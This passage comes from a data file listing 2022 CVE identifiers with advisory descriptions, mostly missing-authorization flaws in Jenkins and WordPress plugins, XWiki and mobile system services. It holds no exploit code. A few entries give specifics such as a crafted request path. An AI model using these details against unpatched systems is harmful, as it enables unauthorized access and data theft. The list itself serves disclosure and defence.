jobs."}, {"Reference": "CVE-2022-3489", "Description": "The WP Hide WordPress plugin through 0.0.2 does not have authorisation and CSRF checks in place when updating the custom_wpadmin_slug settings, allowing unauthenticated attackers to update it with a crafted request"}, {"Reference": "CVE-2022-3501", "Description": "Article template contents with sensitive data could be accessed from agents without permissions."}, {"Reference": "CVE-2022-35247", "Description": "A information disclosure vulnerability exists in Rocket.chat <v5, <v4.8.2 and <v4.7.5 where the lack of ACL checks in the getRoomRoles Meteor method leak channel members with special roles to unauthorized clients."}, {"Reference": "CVE-2022-35293", "Description": "Due to insecure session management, SAP Enable Now allows an unauthenticated attacker to gain access to user's account. On successful exploitation, an attacker can view or modify user data causing limited impact on confidentiality and integrity of the application."}, {"Reference": "CVE-2022-3538", "Description": "The Webmaster Tools Verification WordPress plugin through 1.2 does not have authorisation and CSRF checks when disabling plugins, allowing unauthenticated users to disable arbitrary plugins"}, {"Reference": "CVE-2022-36068", "Description": "Discourse is an open source discussion platform. In versions prior to 2.8.9 on the `stable` branch and prior to 2.9.0.beta10 on the `beta` and `tests-passed` branches, a moderator can create new and edit existing themes by using the API when they should not be able to do so. The problem is patched in version 2.8.9 on the `stable` branch and version 2.9.0.beta10 on the `beta` and `tests-passed` branches. There are no known workarounds."}, {"Reference": "CVE-2022-36340", "Description": "Unauthenticated Optin Campaign Cache Deletion vulnerability in MailOptin plugin <= 1.2.49.0 at WordPress."}, {"Reference": "CVE-2022-36883", "Description": "A missing permission check in Jenkins Git Plugin 4.11.3 and earlier allows unauthenticated attackers to trigger builds of jobs configured to use an attacker-specified Git repository and to cause them to check out an attacker-specified commit."}, {"Reference": "CVE-2022-36888", "Description": "A missing permission check in Jenkins HashiCorp Vault Plugin 354.vdb_858fd6b_f48 and earlier allows attackers with Overall/Read permission to obtain credentials stored in Vault with attacker-specified path and keys."}, {"Reference": "CVE-2022-36891", "Description": "A missing permission check in Jenkins Deployer Framework Plugin 85.v1d1888e8c021 and earlier allows attackers with Item/Read permission but without Deploy Now/Deploy permission to read deployment logs."}, {"Reference": "CVE-2022-36892", "Description": "Jenkins rhnpush-plugin Plugin 0.5.1 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Item/Read permission but without Item/Workspace or Item/Configure permission to check whether attacker-specified file patterns match workspace contents."}, {"Reference": "CVE-2022-36893", "Description": "Jenkins rpmsign-plugin Plugin 0.5.0 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Item/Read permission but without Item/Workspace or Item/Configure permission to check whether attacker-specified file patterns match workspace contents."}, {"Reference": "CVE-2022-36895", "Description": "A missing permission check in Jenkins Compuware Topaz Utilities Plugin 1.0.8 and earlier allows attackers with Overall/Read permission to enumerate hosts and ports of Compuware configurations and credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36896", "Description": "A missing permission check in Jenkins Compuware Source Code Download for Endevor, PDS, and ISPW Plugin 2.0.12 and earlier allows attackers with Overall/Read permission to enumerate hosts and ports of Compuware configurations and credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36897", "Description": "A missing permission check in Jenkins Compuware Xpediter Code Coverage Plugin 1.0.7 and earlier allows attackers with Overall/Read permission to enumerate hosts and ports of Compuware configurations and credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36898", "Description": "A missing permission check in Jenkins Compuware ISPW Operations Plugin 1.0.8 and earlier allows attackers with Overall/Read permission to enumerate hosts and ports of Compuware configurations and credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36903", "Description": "A missing permission check in Jenkins Repository Connector Plugin 2.2.0 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36904", "Description": "Jenkins Repository Connector Plugin 2.2.0 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system."}, {"Reference": "CVE-2022-36907", "Description": "A missing permission check in Jenkins OpenShift Deployer Plugin 1.2.0 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified username and password."}, {"Reference": "CVE-2022-36909", "Description": "A missing permission check in Jenkins OpenShift Deployer Plugin 1.2.0 and earlier allows attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system and to upload a SSH key file from the Jenkins controller file system to an attacker-specified URL."}, {"Reference": "CVE-2022-36910", "Description": "Jenkins Lucene-Search Plugin 370.v62a5f618cd3a and earlier does not perform a permission check in several HTTP endpoints, allowing attackers with Overall/Read permission to reindex the database and to obtain information about jobs otherwise inaccessible to them."}, {"Reference": "CVE-2022-36912", "Description": "A missing permission check in Jenkins Openstack Heat Plugin 1.5 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL."}, {"Reference": "CVE-2022-36913", "Description": "Jenkins Openstack Heat Plugin 1.5 and earlier does not perform permission checks in methods implementing form validation, allowing attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system."}, {"Reference": "CVE-2022-36914", "Description": "Jenkins Files Found Trigger Plugin 1.5 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system."}, {"Reference": "CVE-2022-36915", "Description": "Jenkins Android Signing Plugin 2.2.5 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Item/Read permission but without Item/Workspace or Item/Configure permission to check whether attacker-specified file patterns match workspace contents."}, {"Reference": "CVE-2022-36917", "Description": "A missing permission check in Jenkins Google Cloud Backup Plugin 0.6 and earlier allows attackers with Overall/Read permission to request a manual backup."}, {"Reference": "CVE-2022-36918", "Description": "Jenkins Buckminster Plugin 1.1.1 and earlier does not perform a permission check in a method implementing form validation, allowing attackers with Overall/Read permission to check for the existence of an attacker-specified file path on the Jenkins controller file system."}, {"Reference": "CVE-2022-36919", "Description": "A missing permission check in Jenkins Coverity Plugin 1.11.4 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-36921", "Description": "A missing permission check in Jenkins Coverity Plugin 1.11.4 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-38367", "Description": "The Netic User Export add-on before 2.0.6 for Atlassian Jira does not perform authorization checks. This might allow an unauthenticated user to export all users from Jira by making an HTTP request to the affected endpoint."}, {"Reference": "CVE-2022-38370", "Description": "Apache IoTDB grafana-connector version 0.13.0 contains an interface without authorization, which may expose the internal structure of database. Users should upgrade to version 0.13.1 which addresses this issue."}, {"Reference": "CVE-2022-39960", "Description": "The Netic Group Export add-on before 1.0.3 for Atlassian Jira does not perform authorization checks. This might allow an unauthenticated user to export all groups from the Jira instance by making a groupexport_download=true request to a plugins/servlet/groupexportforjira/admin/ URI."}, {"Reference": "CVE-2022-40673", "Description": "KDiskMark before 3.1.0 lacks authorization checking for D-Bus methods such as Helper::flushPageCache."}, {"Reference": "CVE-2022-41250", "Description": "A missing permission check in Jenkins SCM HttpClient Plugin 1.5 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified HTTP server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-41251", "Description": "A missing permission check in Jenkins Apprenda Plugin 2.2.0 and earlier allows users with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-41252", "Description": "Missing permission checks in Jenkins CONS3RT Plugin 1.0.0 and earlier allows users with Overall/Read permission to enumerate credentials ID of credentials stored in Jenkins."}, {"Reference": "CVE-2022-41254", "Description": "Missing permission checks in Jenkins CONS3RT Plugin 1.0.0 and earlier allow attackers with Overall/Read permission to connect to an attacker-specified HTTP server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-4169", "Description": "The Theme and plugin translation for Polylang is vulnerable to authorization bypass in versions up to, and including, 3.2.16 due to missing capability checks in the process_polylang_theme_translation_wp_loaded() function. This makes it possible for unauthenticated attackers to update plugin and theme translation settings and to import translation strings."}, {"Reference": "CVE-2022-41929", "Description": "org.xwiki.platform:xwiki-platform-oldcore is missing authorization in User#setDisabledStatus, which may allow an incorrectly authorized user with only Script rights to enable or disable a user. This operation is meant to only be available for users with admin rights. This problem has been patched in XWiki 13.10.7, 14.4.2 and 14.5RC1."}, {"Reference": "CVE-2022-41930", "Description": "org.xwiki.platform:xwiki-platform-user-profile-ui is missing authorization to enable or disable users. Any user (logged in or not) with access to the page XWiki.XWikiUserProfileSheet can enable or disable any user profile. This might allow to a disabled user to re-enable themselves, or to an attacker to disable any user of the wiki. The problem has been patched in XWiki 13.10.7, 14.5RC1 and 14.4.2. Workarounds: The problem can be patched immediately by editing the page `XWiki.XWikiUserProfileSheet` in the wiki and by performing the changes contained in https://github.com/xwiki/xwiki-platform/commit/5be1cc0adf917bf10899c47723fa451e950271fa."}, {"Reference": "CVE-2022-41937", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. The application allows anyone with view access to modify any page of the wiki by importing a crafted XAR package. The problem has been patched in XWiki 14.6RC1, 14.6 and 13.10.8. As a workaround, setting the right of the page Filter.WebHome and making sure only the main wiki administrators can view the application installed on main wiki or edit the page and apply the changed described in commit fb49b4f."}, {"Reference": "CVE-2022-43413", "Description": "Jenkins Job Import Plugin 3.5 and earlier does not perform a permission check in an HTTP endpoint, allowing attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-43417", "Description": "Jenkins Katalon Plugin 1.0.32 and earlier does not perform permission checks in several HTTP endpoints, allowing attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-43427", "Description": "Jenkins Compuware Topaz for Total Test Plugin 2.4.8 and earlier does not perform permission checks in several HTTP endpoints, allowing attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-43431", "Description": "Jenkins Compuware Strobe Measurement Plugin 1.0.1 and earlier does not perform a permission check in an HTTP endpoint, allowing attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-4501", "Description": "The Mega Addons plugin for WordPress is vulnerable to authorization bypass due to a missing capability check on the vc_saving_data function in versions up to, and including, 4.2.7. This makes it possible for authenticated attackers, with subscriber-level permissions and above, to update the plugin's settings."}, {"Reference": "CVE-2022-4555", "Description": "The WP Shamsi plugin for WordPress is vulnerable to authorization bypass due to a missing capability check on the deactivate() function hooked via init() in versions up to, and including, 4.1.0. This makes it possible for unauthenticated attackers to deactivate arbitrary plugins on the site. This can be used to deactivate security plugins that aids in exploiting other vulnerabilities."}, {"Reference": "CVE-2022-4931", "Description": "The BackupWordPress plugin for WordPress is vulnerable to information disclosure in versions up to, and including 3.12. This is due to missing authorization on the heartbeat_received() function that triggers on WordPress heartbeat. This makes it possible for authenticated attackers, with subscriber-level permissions and above to retrieve back-up paths that can subsequently be used to download the back-up."}, {"Reference": "CVE-2022-4932", "Description": "The Total Upkeep plugin for WordPress is vulnerable to information disclosure in versions up to, and including 1.14.13. This is due to missing authorization on the heartbeat_received() function that triggers on WordPress heartbeat. This makes it possible for authenticated attackers, with subscriber-level permissions and above to retrieve back-up paths that can subsequently be used to download the back-up."}, {"Reference": "CVE-2021-36225", "Description": "Western Digital My Cloud devices before OS5 allow REST API access by low-privileged accounts, as demonstrated by API commands for firmware uploads and installation."}, {"Reference": "CVE-2022-2108", "Description": "The plugin Wbcom Designs \u2013 BuddyPress Group Reviews for WordPress is vulnerable to unauthorized settings changes and review modification due to missing capability checks and improper nonce checks in several functions related to said actions in versions up to, and including, 2.8.3. This makes it possible for unauthenticated attackers to modify reviews and plugin settings on the affected site."}, {"Reference": "CVE-2022-21707", "Description": "wasmCloud Host Runtime is a server process that securely hosts and provides dispatch for web assembly (WASM) actors and capability providers. In versions prior to 0.52.2 actors can bypass capability authorization. Actors are normally required to declare their capabilities for inbound invocations, but with this vulnerability actor capability claims are not verified upon receiving invocations. This compromises the security model for actors as they can receive unauthorized invocations from linked capability providers. The problem has been patched in versions `0.52.2` and greater. There is no workaround and users are advised to upgrade to an unaffected version as soon as possible."}, {"Reference": "CVE-2022-24450", "Description": "NATS nats-server before 2.7.2 has Incorrect Access Control. Any authenticated user can obtain the privileges of the System account by misusing the \"dynamically provisioned sandbox accounts\" feature."}, {"Reference": "CVE-2022-2459", "Description": "An issue has been discovered in GitLab EE affecting all versions before 15.0.5, all versions starting from 15.1 before 15.1.4, all versions starting from 15.2 before 15.2.1. It may be possible for email invited members to join a project even after the Group Owner has enabled the setting to prevent members from being added to projects in a group, if the invite was sent before the setting was enabled."}, {"Reference": "CVE-2022-29906", "Description": "The admin API module in the QuizGame extension for MediaWiki through 1.37.2 (before 665e33a68f6fa1167df99c0aa18ed0157cdf9f66) omits a check for the quizadmin user."}, {"Reference": "CVE-2022-30594", "Description": "The Linux kernel before 5.17.2 mishandles seccomp permissions. The PTRACE_SEIZE code path allows attackers to bypass intended restrictions on setting the PT_SUSPEND_SECCOMP flag."}, {"Reference": "CVE-2022-31595", "Description": "SAP Financial Consolidation - version 1010,?does not perform necessary authorization checks for an authenticated user, resulting in escalation of privileges. "}, {"Reference": "CVE-2022-39233", "Description": "Tuleap is a Free & Open Source Suite to improve management of software developments and collaboration. In versions 12.9.99.228 and above, prior to 14.0.99.24, authorizations are not properly verified when updating the branch prefix used by the GitLab repository integration. Authenticated users can change the branch prefix of any of the GitLab repository integration they can see vie the REST endpoint `PATCH /gitlab_repositories/{id}`. This action should be restricted to Git administrators. This issue is patched in Tuleap Community Edition 14.0.99.24 and Tuleap Enterprise Edition 14.0-3. There are no known workarounds."}, {"Reference": "CVE-2022-39329", "Description": "Nextcloud Server is the file server software for Nextcloud, a self-hosted productivity platform. Nextcloud Server and Nextcloud Enterprise Server prior to versions 23.0.9 and 24.0.5 are vulnerable to exposure of information that cannot be controlled by administrators without direct database access. Versions 23.0.9 and 24.0.5 contains patches for this issue. No known workarounds are available."}, {"Reference": "CVE-2022-39340", "Description": "OpenFGA is an authorization/permission engine. Prior to version 0.2.4, the `streamed-list-objects` endpoint was not validating the authorization header, resulting in disclosure of objects in the store. Users `openfga/openfga` versions 0.2.3 and prior who are exposing the OpenFGA service to the internet are vulnerable. Version 0.2.4 contains a patch for this issue."}, {"Reference": "CVE-2022-41230", "Description": "Jenkins Build-Publisher Plugin 1.22 and earlier does not perform a permission check in an HTTP endpoint, allowing attackers with Overall/Read permission to obtain names and URLs of Jenkins servers that the plugin is configured to publish builds to, as well as builds pending for publication to those Jenkins servers."}, {"Reference": "CVE-2022-42903", "Description": "Zoho ManageEngine SupportCenter Plus through 11024 allows low-privileged users to view the organization users list."}, {"Reference": "CVE-2022-45636", "Description": "An issue discovered in MEGAFEIS, BOFEI DBD+ Application for IOS & Android v1.4.4 allows attacker to unlock model(s) without authorization via arbitrary API requests."}, {"Reference": "CVE-2022-48367", "Description": "An issue was discovered in eZ Publish Ibexa Kernel before 7.5.28. Access control based on object state is mishandled."}, {"Reference": "CVE-2022-36836", "Description": "Unprotected provider vulnerability in Charm by Samsung prior to version 1.2.3 allows attackers to read connection state without permission."}, {"Reference": "CVE-2022-38669", "Description": "In soundrecorder service, there is a missing permission check. This could lead to elevation of privilege in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38670", "Description": "In soundrecorder service, there is a missing permission check. This could lead to elevation of privilege in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38677", "Description": "In cell service, there is a missing permission check. This could lead to local denial of service in cell service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38678", "Description": "In contacts service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38679", "Description": "In music service, there is a missing permission check. This could lead to local denial of service in music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38682", "Description": "In contacts service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38683", "Description": "In contacts service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38684", "Description": "In contacts service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38687", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in messaging service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38688", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-38689", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-38697", "Description": "In messaging service, there is a missing permission check. This could lead to access unexpected provider in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-38698", "Description": "In messaging service, there is a missing permission check. This could lead to elevation of privilege in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39080", "Description": "In messaging service, there is a missing permission check. This could lead to elevation of privilege in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39090", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39091", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39092", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39093", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39094", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39095", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39096", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39097", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39098", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39099", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39100", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39101", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39102", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39103", "Description": "In Gallery service, there is a missing permission check. This could lead to local denial of service in Gallery service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39104", "Description": "In contacts service, there is a missing permission check. This could lead to local denial of service in Contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39107", "Description": "In Soundrecorder service, there is a missing permission check. This could lead to elevation of privilege in Soundrecorder service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39108", "Description": "In Music service, there is a missing permission check. This could lead to elevation of privilege in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39109", "Description": "In Music service, there is a missing permission check. This could lead to elevation of privilege in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39110", "Description": "In Music service, there is a missing permission check. This could lead to elevation of privilege in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39111", "Description": "In Music service, there is a missing permission check. This could lead to elevation of privilege in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39112", "Description": "In Music service, there is a missing permission check. This could lead to local denial of service in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39113", "Description": "In Music service, there is a missing permission check. This could lead to local denial of service in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39114", "Description": "In Music service, there is a missing permission check. This could lead to local denial of service in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39115", "Description": "In Music service, there is a missing permission check. This could lead to local denial of service in Music service with no additional execution privileges needed."}, {"Reference": "CVE-2022-39117", "Description": "In messaging service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-39119", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed"}, {"Reference": "CVE-2022-3920", "Description": "HashiCorp Consul and Consul Enterprise 1.13.0 up to 1.13.3 do not filter cluster filtering's imported nodes and services for HTTP or RPC endpoints used by the UI. Fixed in 1.14.0."}, {"Reference": "CVE-2022-3946", "Description": "The Welcart e-Commerce WordPress plugin before 2.8.4 does not have authorisation and CSRF in an AJAX action, allowing any logged-in user to create, update and delete shipping methods."}, {"Reference": "CVE-2022-3961", "Description": "The Directorist WordPress plugin before 7.4.4 does not prevent users with low privileges (like subscribers) from accessing sensitive system information."}, {"Reference": "CVE-2022-39861", "Description": "Unprotected Receiver in AtBroadcastReceiver in FactoryCamera prior to version 3.5.51 allows attackers to record video without camera privilege."}, {"Reference": "CVE-2022-39975", "Description": "The Layout module in Liferay Portal v7.3.3 through v7.4.3.34, and Liferay DXP 7.3 before update 10, and 7.4 before update 35 does not check user permission before showing the preview of a \"Content Page\" type page, allowing attackers to view unpublished \"Content Page\" pages via URL manipulation."}, {"Reference": "CVE-2022-3999", "Description": "The DPD Baltic Shipping WordPress plugin before 1.2.57 does not have authorisation and CSRF in an AJAX action, which could allow any authenticated users, such as subscriber to delete arbitrary options from the blog, which could make the blog unavailable."}, {"Reference": "CVE-2022-4024", "Description": "The Registration Forms WordPress plugin before 3.8.1.3 does not have authorisation and CSRF when deleting users via an init action handler, allowing unauthenticated attackers to delete arbitrary users (along with their posts)"}, {"Reference": "CVE-2022-4103", "Description": "The Royal Elementor Addons WordPress plugin before 1.3.56 does not have authorisation and CSRF checks when creating a template, and does not ensure that the post created is a template. This could allow any authenticated users, such as subscriber to create a post (as well as any post type) with an arbitrary title"}, {"Reference": "CVE-2022-41228", "Description": "A missing permission check in Jenkins NS-ND Integration Performance Publisher Plugin 4.8.0.129 and earlier allows attackers with Overall/Read permissions to connect to an attacker-specified webserver using attacker-specified credentials."}, {"Reference": "CVE-2022-41233", "Description": "Jenkins Rundeck Plugin 3.6.11 and earlier does not perform Run/Artifacts permission checks in multiple HTTP endpoints, allowing attackers with Item/Read permission to obtain information about build artifacts of a given job, if the optional Run/Artifacts permission is enabled."}, {"Reference": "CVE-2022-41234", "Description": "Jenkins Rundeck Plugin 3.6.11 and earlier does not protect access to the /plugin/rundeck/webhook/ endpoint, allowing users with Overall/Read permission to trigger jobs that are configured to be triggerable via Rundeck."}, {"Reference": "CVE-2022-41238", "Description": "A missing permission check in Jenkins DotCi Plugin 2.40.00 and earlier allows unauthenticated attackers to trigger builds of jobs corresponding to the attacker-specified repository for attacker-specified commits."}, {"Reference": "CVE-2022-4124", "Description": "The Popup Manager WordPress plugin through 1.6.6 does not have authorisation and CSRF checks when deleting popups, which could allow unauthenticated users to delete them"}, {"Reference": "CVE-2022-41242", "Description": "A missing permission check in Jenkins extreme-feedback Plugin 1.7 and earlier allows attackers with Overall/Read permission to discover information about job names attached to lamps, discover MAC and IP addresses of existing lamps, and rename lamps."}, {"Reference": "CVE-2022-41246", "Description": "A missing permission check in Jenkins Worksoft Execution Manager Plugin 10.0.3.503 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-41692", "Description": "Missing Authorization vulnerability in Appointment Hour Booking plugin <= 1.3.71 on WordPress."}, {"Reference": "CVE-2022-42488", "Description": "OpenHarmony-v3.1.2 and prior versions have a Missing permission validation vulnerability in param service of startup subsystem. An malicious application installed on the device could elevate its privileges to the root user, disable security features, or cause DoS by disabling particular services."}, {"Reference": "CVE-2022-42776", "Description": "In UscAIEngine service, there is a missing permission check. This could lead to set up UscAIEngine service with no additional execution privileges needed."}, {"Reference": "CVE-2022-42777", "Description": "In power management service, there is a missing permission check. This could lead to set up power management service with no additional execution privileges needed."}, {"Reference": "CVE-2022-42778", "Description": "In windows manager service, there is a missing permission check. This could lead to set up windows manager service with no additional execution privileges needed."}, {"Reference": "CVE-2022-43482", "Description": "Missing Authorization vulnerability in Appointment Booking Calendar plugin <= 1.3.69 on WordPress."}, {"Reference": "CVE-2022-4384", "Description": "The Stream WordPress plugin before 3.9.2 does not prevent users with little privileges on the site (like subscribers) from using its alert creation functionality, which may enable them to leak sensitive information."}, {"Reference": "CVE-2022-4385", "Description": "The Intuitive Custom Post Order WordPress plugin before 3.1.4 does not check for authorization in the update-menu-order ajax action, allowing any logged in user (with roles as low as Subscriber) to update the menu order"}, {"Reference": "CVE-2022-44422", "Description": "In music service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44423", "Description": "In music service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44424", "Description": "In music service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44434", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44435", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44436", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44437", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44438", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-44439", "Description": "In messaging service, there is a missing permission check. This could lead to local denial of service in contacts service with no additional execution privileges needed."}, {"Reference": "CVE-2022-45385", "Description": "A missing permission check in Jenkins CloudBees Docker Hub/Registry Notification Plugin 2.6.2 and earlier allows unauthenticated attackers to trigger builds of jobs corresponding to the attacker-specified repository."}, {"Reference": "CVE-2022-45389", "Description": "A missing permission check in Jenkins XP-Dev Plugin 1.0 and earlier allows unauthenticated attackers to trigger builds of jobs corresponding to an attacker-specified repository."}, {"Reference": "CVE-2022-45390", "Description": "A missing permission check in Jenkins loader.io Plugin 1.0.1 and earlier allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins."}, {"Reference": "CVE-2022-45394", "Description": "A missing permission check in Jenkins Delete log Plugin 1.0 and earlier allows attackers with Item/Read permission to delete build logs."}, {"Reference": "CVE-2022-45399", "Description": "A missing permission check in Jenkins Cluster Statistics Plugin 0.4.6 and earlier allows attackers to delete recorded Jenkins Cluster Statistics."}, {"Reference": "CVE-2022-47341", "Description": "In engineermode services, there is a missing permission check. This could lead to local escalation of privilege with system execution privileges needed."}, {"Reference": "CVE-2022-47358", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2022-47361", "Description": "In firewall service, there is a missing permission check. This could lead to local escalation of privilege with system execution privileges needed."}, {"Reference": "CVE-2022-47461", "Description": "In telephone service, there is a missing permission check. This could lead to local escalation of privilege with system execution privileges needed."}, {"Reference": "CVE-2022-47462", "Description": "In telephone service, there is a missing permission check. This could lead to local escalation of privilege with system execution privileges needed."}, {"Reference": "CVE-2022-47471", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47472", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47473", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47474", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47475", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47476", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47477", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47478", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47479", "Description": "In telephony service, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47480", "Description": "In telephony service, there is a missing permission check. This could lead to local denial of service in telephone service with no additional execution privileges needed."}, {"Reference": "CVE-2022-47481", "Description": "In telephony service, there is a missing permission check. This could lead to local denial of service in telephone service with no additional execution privileges needed."}, {"Reference": "CVE-2022-47482", "Description": "In telephony service, there is a missing permission check. This could lead to local denial of service in telephone service with no additional execution privileges needed."}, {"Reference": "CVE-2022-47483", "Description": "In telephony service, there is a missing permission check. This could lead to local denial of service in telephone service with no additional execution privileges needed."}, {"Reference": "CVE-2022-47484", "Description": "In telephony service, there is a missing permission check. This could lead to local denial of service in telephone service with no additional execution privileges needed."}, {"Reference": "CVE-2022-48318", "Description": "No authorisation controls in the RestAPI documentation for Tribe29's Checkmk <= 2.1.0p13 and Checkmk <= 2.0.0p29 which may lead to unintended information disclosure through automatically generated user specific tags within Rest API documentation."}, {"Reference": "CVE-2022-4872", "Description": "The Chained Products WordPress plugin before 2.12.0 does not have authorisation and CSRF checks, as well as does not ensure that the option to be updated belong to the plugin, allowing unauthenticated attackers to set arbitrary options to 'no'"}, {"Reference": "CVE-2022-0404", "Description": "The Material Design for Contact Form 7 WordPress plugin through 2.6.4 does not check authorization or 